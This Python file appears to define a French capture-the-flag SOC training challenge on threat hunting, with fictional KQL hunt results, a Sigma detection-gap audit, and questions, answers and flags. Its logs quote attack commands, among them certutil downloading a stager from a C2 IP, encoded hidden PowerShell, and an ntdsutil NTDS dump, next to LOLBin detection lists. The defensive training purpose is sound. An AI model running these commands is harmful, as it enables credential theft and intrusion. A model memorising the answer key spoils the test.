"""
Challenge 17 -- Threat Hunting Proactif
Niveau : 5 (Threat Hunter)
Categorie : Threat Hunting
"""

ARTIFACT_HUNT_HYPOTHESES = r"""
========== DOSSIER THREAT HUNTING -- Session post-incident ==========
Analyste Lead : Equipe SOC RedPawn
Date : 19/02/2026
Objectif : Identifier les gaps de detection et traquer les menaces residuelles

===== HYPOTHESE DE CHASSE #1 : Persistance non detectee =====

Requete KQL (Microsoft Sentinel) :
  DeviceRegistryEvents
  | where Timestamp > ago(30d)
  | where ActionType in ("RegistryValueSet", "RegistryKeyCreated")
  | where RegistryKey has_any ("Run", "RunOnce", "Services", "Winlogon",
          "Shell", "UserInit", "AppInit_DLLs", "Image File Execution")
  | where InitiatingProcessAccountName !in ("SYSTEM", "LOCAL SERVICE")
  | where InitiatingProcessFileName !in ("svchost.exe", "services.exe",
          "csrss.exe", "msiexec.exe", "setup.exe")
  | project Timestamp, DeviceName, RegistryKey, RegistryValueName,
            RegistryValueData, InitiatingProcessFileName,
            InitiatingProcessAccountName
  | sort by Timestamp desc

Resultats (9 entrees) :

#  TIMESTAMP              DEVICE              KEY                                          VALUE_NAME            VALUE_DATA                                             PROCESS           USER
1  2026-02-18 12:05:11    SRV-DC-01          HKLM\...\Run                                 WinDefUpdate          C:\Windows\Temp\health_check.exe                       reg.exe           svc-backup
2  2026-02-18 12:04:55    SRV-DC-01          HKLM\...\Services\WinDefHealthCheck           ImagePath             C:\Windows\Temp\health_check.exe                       sc.exe            svc-backup
3  2026-02-17 15:30:22    WKS-COMPTA-PC03    HKCU\...\Run                                 GoogleUpdate          C:\Users\j.martin\AppData\Local\Google\updater.exe     powershell.exe    j.martin
4  2026-02-15 14:00:00    WKS-IT-PC01        HKLM\...\Run                                 TeamViewer            C:\Program Files\TeamViewer\TeamViewer.exe              TeamViewer.exe    admin.local
5  2026-02-14 11:45:33    SRV-FILE-01        HKLM\...\Services\BackupAgent                ImagePath             C:\Program Files\Veeam\Agent\VeeamAgent.exe             services.exe      SYSTEM
6  2026-02-12 16:20:00    WKS-HR-PC02        HKCU\...\Run                                 OneDrive              %LOCALAPPDATA%\Microsoft\OneDrive\OneDrive.exe          OneDriveSetup.exe m.petit
7  2026-02-08 10:00:11    SRV-WEB-01         HKLM\...\Run                                 MonitoringAgent       C:\opt\monitoring\agent.exe                             ansible.exe       deploy
8  2026-02-18 13:20:00    SRV-DC-01          HKLM\...\Run                                 WindowsOptimizer      C:\ProgramData\Microsoft\Crypto\svc.exe                reg.exe           svc-backup
9  2026-02-05 09:30:00    WKS-DEV-PC01       HKCU\...\Run                                 Slack                 C:\Users\a.bernard\AppData\Local\slack\Slack.exe        Slack.exe         a.bernard

Analyse preliminaire :
  SUSPECTS (persistence malveillante probable):
  - #1, #2: health_check.exe dans C:\Windows\Temp -> binaire malveillant connu
  - #3: updater.exe lance par powershell.exe dans un profil utilisateur -> suspect
  - #8: svc.exe dans ProgramData\Microsoft\Crypto -> chemin inhabituel, meme session que #1/#2

  LEGITIMES (a confirmer):
  - #4: TeamViewer installe dans Program Files via son propre installeur
  - #5: Veeam via services.exe (SYSTEM) -> installation normale
  - #6: OneDrive via son propre setup -> normal
  - #7: Monitoring agent deploye par Ansible -> infrastructure as code
  - #9: Slack auto-start dans le profil utilisateur -> normal


===== HYPOTHESE DE CHASSE #2 : Comptes suspects crees =====

Requete KQL :
  IdentityDirectoryEvents
  | where Timestamp > ago(30d)
  | where ActionType == "Account created"
  | project Timestamp, AccountName, AccountDomain, ActivityType,
            TargetDeviceName, AdditionalFields
        | sort by Timestamp desc

Resultats (5 entrees) :

#  TIMESTAMP              ACCOUNT_NAME     DOMAIN         TARGET_DEVICE    ADDITIONAL_INFO
1  2026-02-18 13:15:00    support_it       REDPAWN        SRV-DC-01       MemberOf: Domain Admins, Remote Desktop Users
                                                                          Cree par: svc-backup | RequestTicket: AUCUN
2  2026-02-18 06:30:00    svc-monitoring   REDPAWN        SRV-DC-01       MemberOf: Domain Users
                                                                          Cree par: admin.rsi | RequestTicket: CHG-2026-0142
3  2026-02-15 14:00:00    n.bernard        REDPAWN        SRV-DC-01       MemberOf: Domain Users, Comptabilite
                                                                          Cree par: admin.rsi | RequestTicket: CHG-2026-0138
4  2026-02-10 09:00:00    stagiaire.2026   REDPAWN        SRV-DC-01       MemberOf: Domain Users, Stagiaires
                                                                          Cree par: admin.rsi | RequestTicket: CHG-2026-0135
5  2026-02-06 11:00:00    svc-sql          REDPAWN        SRV-DC-01       MemberOf: Domain Users, SQL Admins
                                                                          Cree par: admin.rsi | RequestTicket: CHG-2026-0130

Analyse :
  SUSPECT:
  - #1 support_it: Cree par svc-backup (compte compromis), membre Domain Admins,
    AUCUN ticket de changement -> Backdoor account tres probable
  - #2 svc-monitoring: Ticket de changement existe (CHG-2026-0142) mais cree
    le MEME JOUR que l'attaque a 06:30 par admin.rsi -> A VERIFIER aupres de l'IT
    Le ticket pourrait etre legitime OU cree par l'attaquant via admin.rsi compromis

  LEGITIMES:
  - #3 n.bernard: Nouvel employe comptabilite, ticket OK
  - #4 stagiaire.2026: Stage planifie, ticket OK
  - #5 svc-sql: Compte service SQL, ticket OK, cree AVANT l'attaque


===== HYPOTHESE DE CHASSE #3 : Execution suspecte de LOLBins =====

Requete KQL :
  DeviceProcessEvents
  | where Timestamp between (datetime(2026-02-06) .. datetime(2026-02-19))
  | where FileName in~ ("certutil.exe", "bitsadmin.exe", "mshta.exe",
          "regsvr32.exe", "rundll32.exe", "wmic.exe", "cmstp.exe",
          "msbuild.exe", "installutil.exe", "cscript.exe", "wscript.exe",
          "powershell.exe", "cmd.exe", "ntdsutil.exe", "dsquery.exe",
          "csvde.exe", "ldifde.exe", "psexec.exe", "procdump.exe")
  | where InitiatingProcessFileName != "services.exe"
  | project Timestamp, DeviceName, FileName, ProcessCommandLine,
            InitiatingProcessFileName, AccountName
  | sort by Timestamp

Resultats pertinents (filtres, 14 entrees) :

#   TIMESTAMP              DEVICE              LOLBIN           COMMAND_LINE                                                                              PARENT              USER
1   2026-02-06 17:28:11    WKS-COMPTA-PC03    powershell.exe   powershell -ep bypass -w hidden -e SQBFAFgA...                                            excel.exe           j.martin
2   2026-02-06 17:30:15    WKS-COMPTA-PC03    certutil.exe     certutil -urlcache -split -f http://185.234.72.19/stager.ps1 C:\Windows\Temp\s.ps1         cmd.exe             j.martin
3   2026-02-07 14:00:00    SRV-WEB-01         powershell.exe   powershell -Command "Get-WindowsUpdate -Install -AcceptAll"                                wsus_agent.exe      SYSTEM
4   2026-02-08 10:30:00    WKS-DEV-PC01       powershell.exe   powershell -File C:\Scripts\deploy_test.ps1                                                vscode.exe          a.bernard
5   2026-02-10 09:00:00    SRV-DC-01          csvde.exe        csvde -f C:\Temp\ad_users_report.csv -r "(objectCategory=person)" -l "cn,mail"             cmd.exe             admin.rsi
6   2026-02-12 11:00:00    SRV-BACKUP-01      wscript.exe      wscript C:\BackupSoft\pre_backup.vbs                                                      schtasks.exe        svc-backup
7   2026-02-14 11:45:33    WKS-COMPTA-PC03    wmic.exe         wmic /node:"SRV-DC-01" process call create "cmd /c whoami"                                 cmd.exe             svc-backup
8   2026-02-14 15:16:02    SRV-DC-01          psexec.exe       psexec \\SRV-FILE-01 -u REDPAWN\svc-backup -p *** -c health_check.exe                      cmd.exe             svc-backup
9   2026-02-15 09:00:33    SRV-DC-01          ntdsutil.exe     ntdsutil "ac i ntds" "ifm" "create full C:\Temp\ntds_dump" q q                             cmd.exe             svc-backup
10  2026-02-15 09:30:00    SRV-DC-01          csvde.exe        csvde -f C:\Temp\ad_export.csv -d "DC=redpawn,DC=local"                                    cmd.exe             svc-backup
11  2026-02-15 12:00:00    SRV-DC-01          rundll32.exe     rundll32 C:\ProgramData\Microsoft\Crypto\ntevt.dll,DllRegisterServer                       cmd.exe             svc-backup
12  2026-02-18 08:30:00    WKS-IT-PC01        powershell.exe   powershell -Command "Install-Module PSWindowsUpdate -Force"                                 cmd.exe             t.girard
13  2026-02-18 10:00:00    SRV-BACKUP-01      powershell.exe   powershell -Command "Get-VBRJob | Start-VBRJob"                                            VeeamConsole.exe    svc-backup
14  2026-02-18 13:00:00    WKS-COMPTA-PC03    rundll32.exe     rundll32 C:\Users\j.martin\AppData\Local\Temp\d3d11.dll,DllMain                            explorer.exe        j.martin

Analyse :
  MALVEILLANTS :
  - #1: PowerShell lance par Excel avec base64 -> macro malveillante (initial access)
  - #2: certutil download du C2 -> stager telecharge
  - #7: WMIC remote execution sur le DC -> reconnaissance laterale
  - #8: PsExec deploie health_check.exe -> distribution malware
  - #9: ntdsutil dump NTDS -> vol de la base AD
  - #10: csvde export complet AD -> exfiltration des donnees AD
  - #11: rundll32 charge ntevt.dll (DLL hijack connu C09) -> persistence
  - #14: rundll32 charge d3d11.dll depuis Temp -> DLL suspecte (FP ou malware)

  LEGITIMES :
  - #3: WSUS agent lance PowerShell pour mise a jour Windows -> normal
  - #4: VSCode lance un script de deploy test -> workflow developpeur
  - #5: csvde pour un rapport RH (admin.rsi) AVANT l'attaque -> a verifier date
  - #6: Script VBS de pre-backup lance par tache planifiee -> workflow backup normal
  - #12: t.girard installe un module PowerShell pour gestion updates -> admin IT
  - #13: Console Veeam lance un job de backup -> workflow normal


===== HYPOTHESE DE CHASSE #4 : Connexions reseau anormales =====

Requete KQL :
  DeviceNetworkEvents
  | where Timestamp between (datetime(2026-02-06) .. datetime(2026-02-19))
  | where RemoteIPType == "Public"
  | where RemotePort in (443, 8443, 80, 8080, 4444, 1337, 9001)
  | where InitiatingProcessFileName !in ("chrome.exe", "firefox.exe",
          "msedge.exe", "Teams.exe", "Outlook.exe", "OneDrive.exe",
          "MsMpEng.exe", "svchost.exe", "WindowsUpdate.exe")
  | summarize ConnectionCount = count(), BytesSent = sum(SentBytes),
              BytesReceived = sum(ReceivedBytes),
              DistinctPorts = dcount(RemotePort),
              FirstSeen = min(Timestamp), LastSeen = max(Timestamp)
              by RemoteIP, InitiatingProcessFileName, DeviceName
  | where ConnectionCount > 3
  | sort by ConnectionCount desc

Resultats (8 entrees) :

#  REMOTE_IP          PROCESS              DEVICE              COUNT   BYTES_SENT     BYTES_RECV    PORTS           FIRST_SEEN           LAST_SEEN
1  185.234.72.19      RuntimeBroker.exe    WKS-COMPTA-PC03     847     12,456,789     8,234,567     2 (443,8443)    2026-02-06 17:35     2026-02-18 14:00
2  185.234.72.19      svchost.exe          SRV-DC-01           234     3,456,789      2,345,678     2 (443,8443)    2026-02-14 12:00     2026-02-18 14:00
3  91.215.85.142      RuntimeBroker.exe    WKS-COMPTA-PC03     56      2,892,345      512,456       1 (8443)        2026-02-13 14:00     2026-02-18 14:00
4  52.168.112.45      CrowdStrike.exe      WKS-COMPTA-PC03     1203    456,789        12,345,678    1 (443)         2026-02-06 08:00     2026-02-18 14:00
5  13.107.42.14       Outlook.exe          WKS-COMPTA-PC03     892     8,234,567      45,678,901    1 (443)         2026-02-06 08:00     2026-02-18 14:00
6  193.42.33.7        RuntimeBroker.exe    WKS-COMPTA-PC03     12      45,678         23,456        1 (443)         2026-02-14 03:20     2026-02-14 15:00
7  20.190.159.2       powershell.exe       SRV-WEB-01          45      123,456        2,345,678     1 (443)         2026-02-07 14:00     2026-02-18 08:00
8  104.16.132.229     curl.exe             WKS-DEV-PC01        8       12,345         234,567       1 (443)         2026-02-08 10:00     2026-02-12 16:00

Analyse :
  MALVEILLANTS :
  - #1: RuntimeBroker.exe -> 185.234.72.19 (C2 connu) pendant 12 JOURS -> C2 beacon
  - #2: svchost.exe -> 185.234.72.19 sur SRV-DC-01 -> implant sur le DC
  - #3: RuntimeBroker.exe -> 91.215.85.142 (C2 secondaire) -> fallback C2
  - #6: RuntimeBroker.exe -> 193.42.33.7 (C2 tertiaire, ref. C16) -> tentatives courtes

  LEGITIMES :
  - #4: CrowdStrike vers Azure (52.168.x.x) -> telemetrie EDR normale
  - #5: Outlook vers Microsoft 365 (13.107.x.x) -> emails, trafic normal
  - #7: PowerShell vers Microsoft (PSGallery/NuGet) -> telecharge des modules
  - #8: curl vers Cloudflare -> probablement API calls de dev (a.bernard)


===== HYPOTHESE DE CHASSE #5 : Taches planifiees suspectes =====

Requete KQL :
  DeviceEvents
  | where Timestamp > ago(30d)
  | where ActionType == "ScheduledTaskCreated"
  | project Timestamp, DeviceName, AdditionalFields
  | extend TaskName = parse_json(AdditionalFields).TaskName,
           TaskAction = parse_json(AdditionalFields).TaskAction,
           TaskTrigger = parse_json(AdditionalFields).TaskTrigger,
           TaskUser = parse_json(AdditionalFields).TaskRunAs
  | sort by Timestamp desc

Resultats (6 entrees) :

#  TIMESTAMP              DEVICE              TASK_NAME              ACTION                                                       TRIGGER        RUN_AS
1  2026-02-18 12:05:30    SRV-DC-01          WinDefUpdate           C:\Windows\Temp\health_check.exe                              ONSTART        SYSTEM
2  2026-02-18 12:06:00    SRV-DC-01          SystemHealthReport     powershell -ep bypass -f C:\ProgramData\report.ps1            DAILY 02:00    SYSTEM
3  2026-02-15 15:00:00    SRV-DC-01          GatherNetworkInfo      powershell -ep bypass -e aQBlAHgA... (base64)                 DAILY 03:00    SYSTEM
4  2026-02-15 10:00:00    SRV-BACKUP-01      DailyBackup            C:\BackupSoft\backup.bat                                      DAILY 23:00    svc-backup
5  2026-02-05 09:00:00    SRV-WEB-01         CertRenew              certbot renew --quiet                                         WEEKLY Mon     root
6  2026-02-03 14:00:00    SRV-DC-01          Defrag                 defrag C: /O                                                  WEEKLY Sun     SYSTEM

Analyse :
  MALVEILLANTS :
  - #1: health_check.exe dans Temp, run as SYSTEM -> persistence implant
  - #2: PowerShell bypass dans ProgramData, 02:00 -> backdoor de nuit
  - #3: GatherNetworkInfo modifie (ref. C09) avec base64 encoded -> persistence

  LEGITIMES :
  - #4: Script de backup Veeam -> tache planifiee normale
  - #5: Renouvellement certificat Let's Encrypt -> maintenance normale
  - #6: Defragmentation hebdomadaire -> maintenance Windows standard


===== HYPOTHESE DE CHASSE #6 : Mouvements lateraux non detectes =====

Requete KQL :
  DeviceLogonEvents
  | where Timestamp between (datetime(2026-02-06) .. datetime(2026-02-19))
  | where LogonType in ("RemoteInteractive", "Network", "NewCredentials")
  | where ActionType == "LogonSuccess"
  | where AccountName !in ("SYSTEM", "LOCAL SERVICE", "NETWORK SERVICE")
  | summarize LogonCount = count(), DistinctDevices = dcount(DeviceName),
              Devices = make_set(DeviceName)
              by AccountName, LogonType
  | where DistinctDevices > 2
  | sort by LogonCount desc

Resultats :

#  ACCOUNT_NAME     LOGON_TYPE          COUNT   DISTINCT_DEVICES   DEVICES
1  svc-backup       Network             156     8                  [SRV-DC-01, SRV-FILE-01, SRV-FILE-02, SRV-WEB-01,
                                                                    SRV-BACKUP-01, WKS-COMPTA-PC03, WKS-HR-PC02, WKS-RH-PC01]
2  admin.rsi        RemoteInteractive   42      5                  [SRV-DC-01, SRV-FILE-01, SRV-WEB-01, SRV-BACKUP-01,
                                                                    WKS-IT-PC01]
3  j.martin         Network             23      3                  [WKS-COMPTA-PC03, SRV-FILE-02, SRV-DC-01]
4  t.girard         RemoteInteractive   18      4                  [SRV-DC-01, SRV-WEB-01, SRV-BACKUP-01, WKS-IT-PC01]
5  svc-sql          Network             34      3                  [SRV-DC-01, SRV-SQL-01, SRV-FILE-01]

Analyse :
  SUSPECTS :
  - #1 svc-backup: 156 connexions sur 8 machines est ANORMAL pour un compte de backup
    Baseline pre-incident (janvier): 12 connexions sur 2 machines (SRV-BACKUP-01, SRV-DC-01)
    Le compte a ete utilise pour le mouvement lateral post-compromission
  - #3 j.martin: 23 connexions Network incluant SRV-DC-01 -> pas normal pour comptabilite

  LEGITIMES :
  - #2 admin.rsi: Admin systeme, 5 serveurs est normal pour son role
  - #4 t.girard: Admin IT, 4 machines dans son perimetre habituel
  - #5 svc-sql: Compte service SQL, 3 serveurs (DC pour auth + SQL + File) -> attendu
"""

ARTIFACT_SIGMA_ANALYSIS = r"""
========== AUDIT DES REGLES SIGMA / DETECTION ==========
Analyste : SOC RedPawn -- Detection Engineering
Date : 19/02/2026

===== REGLES EXISTANTES -- AUDIT DE COUVERTURE =====

#   REGLE SIGMA                           STATUS         DERNIERE MAJ    HITS 30J   NOTE
1   Certutil Download (proc_creation)     DESACTIVEE     2025-03-15      0          Desactivee apres trop de FP (Java updates)
2   Suspicious PowerShell Execution       ACTIVE         2025-11-01      847        Trop d'alertes -> N1 ignore systematiquement
3   PsExec Usage                          ACTIVE         2025-06-20      12         Fonctionne mais N1 classe en "outil admin normal"
4   NTDS.dit Access                       ABSENTE        -               -          Jamais creee -- GAP CRITIQUE
5   Mimikatz Keywords                     ACTIVE         2025-09-10      0          Aucun hit (mimikatz reflective echappe la detection)
6   Scheduled Task Creation               ACTIVE         2025-04-01      342        Volume trop eleve, non trie -> inutile en l'etat
7   Service Creation                      ACTIVE         2025-04-01      234        Idem -- volume trop eleve sans contextualisation
8   WMIC Remote Execution                 ABSENTE        -               -          Jamais creee -- GAP
9   RuntimeBroker External Connection     ABSENTE        -               -          Jamais creee -- GAP CRITIQUE
10  Golden Ticket Detection               ACTIVE         2025-12-01      0          Fonctionne en theorie, pas de Kerberos audit actif
11  DCSync Detection                      ACTIVE         2025-12-01      2          2 hits ignores par N1 (classes "replication AD normale")
12  CSVde/LDIFde Export                   ABSENTE        -               -          Jamais creee -- GAP
13  DLL Search Order Hijacking            ABSENTE        -               -          Jamais creee -- GAP
14  Rundll32 Suspicious Arguments         ACTIVE         2025-07-15      23         Fonctionne mais non priorisee (severite: medium)
15  Base64 Encoded PowerShell             ACTIVE         2025-11-01      156        Incluse dans #2, meme probleme de volume

===== BILAN PAR CATEGORIE =====

Categorie                    | Regles | Actives | Efficaces | Gaps
-----------------------------+--------+---------+-----------+------
Initial Access               | 1      | 0       | 0         | 1 (Certutil desactivee)
Execution                    | 3      | 3       | 0         | 0 (mais noyees dans le bruit)
Persistence                  | 3      | 2       | 0         | 1 (DLL hijack absente)
Credential Access            | 3      | 3       | 0         | 0 (mimikatz reflective echappe)
Discovery                    | 1      | 0       | 0         | 1 (WMIC absente)
Lateral Movement             | 1      | 1       | 0         | 0 (PsExec classe admin normal)
Collection/Exfiltration      | 1      | 0       | 0         | 1 (CSVde absente)
C2                           | 1      | 0       | 0         | 1 (RuntimeBroker absente)
TOTAL                        | 14     | 9       | 0         | 5 absentes + 9 inefficaces

Conclusion : Sur 14 regles, AUCUNE n'a ete efficace pour detecter l'attaque.
  - 5 regles sont ABSENTES (gaps critiques)
  - 1 regle est DESACTIVEE (Certutil)
  - 3 regles sont NOYEES DANS LE BRUIT (PowerShell, ScheduledTask, Service)
  - 2 regles sont IGNOREES PAR LE N1 (PsExec, DCSync)
  - 1 regle NE DETECTE PAS la variante (Mimikatz reflective)
  - 2 regles NON PRIORISEES (Rundll32, Golden Ticket sans Kerberos audit)

===== RECOMMANDATIONS DE DETECTION ENGINEERING =====

PRIORITE 1 (deployer dans 24h) :
  A. Creer: RuntimeBroker.exe connexion sortante publique
     -> 0 FP attendu (RuntimeBroker ne doit JAMAIS contacter Internet)
  B. Reactiver: Certutil avec exclusion pour les chemins Java
  C. Creer: ntdsutil.exe execution avec "ifm" ou "create"
  D. Creer: csvde.exe / ldifde.exe execution non planifiee

PRIORITE 2 (deployer dans 7 jours) :
  E. Tuner: PowerShell suspect -> ajouter exclusions WSUS, Veeam, modules PSGallery
  F. Contextualiser: PsExec -> alerter seulement si source != SRV-ADMIN-01
  G. Creer: WMIC /node remote execution
  H. Creer: Rundll32 avec DLL dans Temp, AppData, ou ProgramData

PRIORITE 3 (deployer dans 30 jours) :
  I. Activer l'audit Kerberos pour la detection Golden Ticket
  J. Implementer UEBA pour la detection de comportement anormal des comptes service
  K. Creer: DLL loaded from non-standard path (Sysmon Event 7)
  L. Revoir toutes les regles avec > 100 hits/mois (reduire le bruit)

===== METRIQUES DE DETECTION -- CETTE ATTAQUE =====
Duree totale de l'attaque : 12 jours (06/02 -> 18/02)
Etapes de l'attaque : 10 (Initial Access -> Impact)
Etapes DETECTEES par le SIEM : 4 (PowerShell, PsExec, DCSync, Rundll32)
Etapes ALERTEES pertinentes : 0 (toutes ignorees ou noyees)
Temps moyen entre alerte et action N1 : 14h (les 4 alertes levees)
Alertes classees "faux positif" par N1 : 4/4 (100% de FN)

MTTR (Mean Time to Respond) si detection efficace :
  -> Certutil alerte a 17:30 le 06/02 -> incident declare a 17:30
  -> Temps economise: 11 jours 18h30
"""

CHALLENGE = {
    "id": "c17_threat_hunting",
    "title": "La Chasse est Ouverte",
    "category": "threat_hunting",
    "level": 5,
    "points_total": 680,
    "estimated_time": "55-75 min",
    "story": """
## Briefing de Mission

**Date :** 19 fevrier 2026, 14h00
**Priorite :** HAUTE
**Source :** SOC Lead / Threat Hunting Team

---

Le jour apres l'incident, l'equipe Threat Hunting lance une session proactive pour identifier tous les gaps de detection qui ont permis a l'attaque de progresser sans etre detectee.

Vous disposez de 2 artefacts : le dossier de chasse (6 hypotheses avec requetes KQL et resultats) et l'audit des regles Sigma/detection.

> *"On a contenu l'attaque mais on doit comprendre POURQUOI notre SOC n'a rien vu pendant 12 jours. Les KQL sont la, avec les resultats bruts melanges legit+malveillant. Triez le bruit, identifiez les vrais IOC, et dites-moi exactement quelles regles ont failli et pourquoi."*

<details>
<summary>Indice methodologique (cliquez pour afficher)</summary>

Les resultats KQL melangent volontairement des evenements legitimes et malveillants. Utilisez le contexte (quels comptes sont compromis, quels chemins sont suspects, quels processus sont normaux) pour distinguer les vrais positifs. L'audit Sigma montre que meme les regles existantes ont echoue -- cherchez pourquoi.

</details>
    """,
    "artifacts": [
        {
            "name": "threat_hunt_hypotheses.txt",
            "type": "report",
            "content": ARTIFACT_HUNT_HYPOTHESES,
            "description": "Dossier Threat Hunting -- 6 hypotheses avec resultats KQL"
        },
        {
            "name": "sigma_detection_audit.txt",
            "type": "audit",
            "content": ARTIFACT_SIGMA_ANALYSIS,
            "description": "Audit des regles Sigma et analyse des gaps de detection"
        }
    ],
    "questions": [
        {
            "id": "q1",
            "text": "Combien d'entrees de persistance registre (Hypothese #1) sont MALVEILLANTES ?",
            "answer": "4",
            "flag": "REDPAWN{4}",
            "points": 50,
            "hints": [
                "Analysez chaque entree: chemin du binaire, processus parent, utilisateur",
                "#1 health_check dans Temp, #2 service health_check, #3 updater.exe via powershell, #8 svc.exe dans Crypto"
            ],
            "hint_cost": 17
        },
        {
            "id": "q2",
            "text": "Combien de LOLBins dans l'Hypothese #3 sont des executions MALVEILLANTES ?",
            "answer": "8",
            "flag": "REDPAWN{8}",
            "points": 50,
            "hints": [
                "Comptez les entrees marquees MALVEILLANTS dans l'analyse",
                "#1, #2, #7, #8, #9, #10, #11, #14"
            ],
            "hint_cost": 17
        },
        {
            "id": "q3",
            "text": "Combien de regles Sigma sur 14 sont ABSENTES (jamais creees) selon l'audit ?",
            "answer": "5",
            "flag": "REDPAWN{5}",
            "points": 40,
            "hints": [
                "Comptez les regles avec STATUS: ABSENTE dans l'audit",
                "NTDS, WMIC, RuntimeBroker, CSVde, DLL hijack"
            ],
            "hint_cost": 13
        },
        {
            "id": "q4",
            "text": "Pourquoi la regle Sigma #5 (Mimikatz Keywords) n'a-t-elle genere aucun hit malgre l'utilisation de Mimikatz ?",
            "answer": "mimikatz reflective",
            "flag": "REDPAWN{mimikatz_reflective}",
            "points": 60,
            "hints": [
                "Regardez la note de la regle #5 dans l'audit",
                "Mimikatz charge en memoire de facon reflective echappe la detection basee sur les strings"
            ],
            "hint_cost": 20
        },
        {
            "id": "q5",
            "text": "Combien de jours l'attaque est-elle restee non detectee (duree totale) ?",
            "answer": "12",
            "flag": "REDPAWN{12}",
            "points": 30,
            "hints": [
                "Regardez les metriques de detection dans l'audit Sigma",
                "Du 06/02 au 18/02"
            ],
            "hint_cost": 10
        },
        {
            "id": "q6",
            "text": "Quel pourcentage des alertes levees ont ete classees 'faux positif' par le N1 ?",
            "answer": "100",
            "flag": "REDPAWN{100}",
            "points": 50,
            "hints": [
                "Regardez les metriques de detection dans l'audit Sigma",
                "4 alertes DETECTEES, 4 classees faux positif = ?"
            ],
            "hint_cost": 17
        },
        {
            "id": "q7",
            "text": "Quel compte a le plus de connexions laterales anormales (Hypothese #6) et combien en a-t-il ?",
            "answer": "svc-backup",
            "flag": "REDPAWN{svc-backup}",
            "points": 40,
            "hints": [
                "Regardez le tableau de l'Hypothese #6",
                "156 connexions sur 8 machines vs une baseline de 12 sur 2"
            ],
            "hint_cost": 13
        },
        {
            "id": "q8",
            "text": "Quelle regle de detection (lettre A-L) est la plus urgente car RuntimeBroker ne devrait JAMAIS contacter Internet ?",
            "answer": "A",
            "flag": "REDPAWN{A}",
            "points": 40,
            "hints": [
                "Regardez les recommandations Priorite 1 dans l'audit Sigma",
                "0 FP attendu -> detection quasi-parfaite"
            ],
            "hint_cost": 13
        },
        {
            "id": "q9",
            "text": "Combien de taches planifiees (Hypothese #5) sont malveillantes ?",
            "answer": "3",
            "flag": "REDPAWN{3}",
            "points": 40,
            "hints": [
                "Analysez les 6 taches: chemin, action, contexte",
                "WinDefUpdate, SystemHealthReport, GatherNetworkInfo modifie"
            ],
            "hint_cost": 13
        },
        {
            "id": "q10",
            "text": "Le compte support_it (Hypothese #2) est-il malveillant ? Quel element le prouve de maniere definitive ?",
            "answer": "oui",
            "flag": "REDPAWN{oui}",
            "points": 50,
            "hints": [
                "Qui a cree le compte et quel est son groupe ?",
                "Cree par svc-backup (compromis) + Domain Admins + AUCUN ticket de changement"
            ],
            "hint_cost": 17
        },
        {
            "id": "q11",
            "text": "Pourquoi la regle Certutil (#1) a-t-elle ete desactivee initialement ? (raison courte)",
            "answer": "faux positifs Java",
            "flag": "REDPAWN{faux_positifs_Java}",
            "points": 40,
            "hints": [
                "Regardez la note de la regle #1 dans l'audit Sigma",
                "Les mises a jour Java utilisent certutil legitimement"
            ],
            "hint_cost": 13
        },
        {
            "id": "q12",
            "text": "Si la regle Certutil avait ete active le 06/02, combien de jours et d'heures l'incident aurait-il ete detecte plus tot ? (format: JJj HHh)",
            "answer": "11j 18h",
            "flag": "REDPAWN{11j_18h}",
            "points": 60,
            "hints": [
                "Regardez le MTTR dans les metriques de l'audit Sigma",
                "Certutil alerte le 06/02 a 17:30 vs incident declare le 18/02 a 12:00"
            ],
            "hint_cost": 20
        },
        {
            "id": "q13",
            "text": "Le csvde.exe execute le 10/02 (#5 dans LOLBins) par admin.rsi est-il malveillant ? (oui/non) Pourquoi ?",
            "answer": "non",
            "flag": "REDPAWN{non}",
            "points": 50,
            "hints": [
                "Regardez la date: 10/02 et la commande (filtre sur person, champs cn/mail)",
                "C'est un export limite pour un rapport RH, execute AVANT l'attaque principale sur le DC"
            ],
            "hint_cost": 17
        },
        {
            "id": "q14",
            "text": "Combien d'IP distinctes dans l'Hypothese #4 sont des C2 malveillants confirmes ?",
            "answer": "3",
            "flag": "REDPAWN{3}",
            "points": 40,
            "hints": [
                "Identifiez les IP connues comme C2 dans les challenges precedents",
                "185.234.72.19, 91.215.85.142, 193.42.33.7"
            ],
            "hint_cost": 13
        }
    ]
}
